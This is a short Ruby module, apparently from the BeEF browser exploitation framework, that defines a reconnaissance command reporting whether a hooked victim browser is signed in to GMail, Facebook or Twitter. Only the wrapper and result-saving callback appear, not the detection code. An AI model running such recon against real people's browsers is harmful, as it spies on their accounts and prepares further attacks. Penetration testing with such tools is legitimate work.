class Detect_soc_nets < BeEF::Core::Command
  
  def initialize
    super({
      'Name' => 'Detect Social Networks',
      'Description' => 'This module will detect if the Hooked Browser is currently authenticated to GMail, Facebook and Twitter',
      'Category' => 'Recon',
      'Author' => ['xntrik', 'Mike Cardwell'],
      'Data' => [
        {'name' => 'timeout', 'ui_label' => 'Detection Timeout','value' => '5000'}
      ],
      'File' => __FILE__
    })

    set_target({
      'verified_status' =>  VERIFIED_WORKING, 
      'browser_name' =>     ALL
    })
    
    use 'beef.net.local'
    use_template!
  end
  
  def callback
    content = {}
    content['GMail'] = @datastore['gmail']
    content['Facebook'] = @datastore['facebook']
    content['Twitter']= @datastore['twitter']
    save content
  end
  
end